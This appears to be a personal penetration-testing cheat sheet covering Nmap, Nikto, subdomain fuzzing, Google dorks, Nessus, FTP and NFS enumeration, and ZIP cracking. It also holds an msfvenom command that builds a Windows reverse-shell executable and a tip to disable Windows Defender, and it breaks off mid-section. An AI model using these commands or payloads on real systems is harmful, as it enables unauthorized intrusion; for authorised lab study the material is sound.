
What should be our Methodology when we are seeing a Website  ??
- Service Version Information
- Backend Directory's
- Looking for Source Code
- Potential Vulnerability Scanning With Nikto

<h2>Nmap</h2>

Normal Nmap Scanning
```
nmap -T4 -p- -A -Pn <IP_Address>
```

```
nmap -sS -T4 -p- -Pn <IP_Address>
```

```
nmap -sU -T4 --top-ports 1000 <IP_Address>
```

Ping Sweep
```
nmap -sn -n 10.200.95.0/24 -oA Ping-Sweep
```

```
nmap -sS 10.200.145.33 10.200.145.250 -v -oA Initial-Scan-Subnet1-Hosts
```

<h2>Nikto</h2>
```
 nikto -h <IP_Address>
```

<h2>Fuzzing</h2>
>[!important]  Gobuster

Vhost
```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<IP_Address> -o gobuster/vhost-sub.txt -t 2
```

```
gobuster vhost -w /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -u http://<IP_Address> -t 2 -o gobuster/vhost-sub.txt
```



>[!important] Wfuzz
```
wfuzz -u <URL> -w <wordlist> -H "Host: FUZZ.example.com" --hc <status codes to hide>
```

```
wfuzz -u http://<Hostname> -w /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt  -H "Host: FUZZ.<hostname>" --hc 400
```

```
--hc Hide status code
--hw Hide word count
--hl Hide line count
--hh Hide character count
```


>[!important] ffuf
```
ffuf -u http://holo.live -w /usr/share/wordlists/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -H "HOST:FUZZ.holo.live" -mc 200 -o fuzz_holo.txt
```

```
Response code :
200 means ok
400 means error (i.e. 404 page not found)
300 means redirect
500 means server error
```

>[!important] 


<h2>Sub-Domains</h2>
Sublist3r
```
sublist3r -d <domain_name> -t 100
```

Amass
```
amass enum -d tesla.com 
```

```
amass intel -d tesla.com -whois
```

Httpprobe
```
cat domains.txt | httprobe >> working_domains.txt
```


<h2>Enumeration</h2>
```
wpscan -url <IP_address>    
```


```
whatweb <domain_name>
```


<h2>Google Dorks</h2>
```
site:tesla.com 
```

```
site:tesla.com -www
```

```
site:tesla.com -www -ir 
```

```
site:tesla.com filetype:docx
```

```
site:tesla.com filetype:pdf
```




<h2>Nessus</h2>
```
sudo dpkg -i Nessus-10.2.0-fbsd11-amd64.deb
```

New Scan ---> Vulnerability ---> Basic Network Scan

```
/bin/systemctl start nessusd.service
```

```
https://kali:8834/ 
```

 NEVER TRUST a vulnerability scanner always find it and verify it........


<h2>IP</h2>
```
After we run this command than only we were able to see the IP address.
Command : dhclient
Command : ip a 
```


<h2>ARP-Scan</h2>
```
arp-scan -l
```


<h2>FTP</h2>
```
FTP <ip address>
```

if want to download all the files:
```
wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all
```

```
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all
```


<h2>NFS</h2>
```
Command : showmount -e <Ip address>
where e is used to list out the directories (i.e. mounted file share)
```

```
Command : mkdir /mnt/dev
Command : mount -t nfs 192.168.205.132/srv/nfs /mnt/dev
```

```
Now will make a directory to mount this file share (i.e. /srv/nfs )
will cd to /mnt (i.e. will have a by default directory named mnt )
where t is tack and nfs is the type 
```



<h2>Crack ZIP</h2>
```
 fcrackzip -v 
```

```
 fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
```


<h2>MS Venom</h2>
```
Command : msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.205.128 LPORT=7777 -f exe > Wise.exe
```
where p is payload and f is filetype -o/> for output file



<h2>Dnsrecon </h2>
```
Command : dnsrecon -r 127.0.0.0/24 -n 192.168.205.134 -d blah
```

```
As there is dns record named blackpearl.tcm and have to add that in our Dns and etc/hosts file
Command : nano /etc/hosts (i.e. we have to add the edit the hosts file and not host)
And add 
192.168.205.134 blackpearl.tcm and save it 
```


<h2>Buffer Overflow</h2>

Install Windows 10 in the VM
[Windows 10](https://www.microsoft.com/en-in/evalcenter/evaluate-windows-10-enterprise)

[Immunity Debugger](https://www.immunityinc.com/products/debugger/)

[Vulnserver](https://thegreycorner.com/vulnserver.html) 
Remember that we have to STOP the security (i.e. Windows Defender and than install the software cux it was not letting me to open that )

Spi
```

```

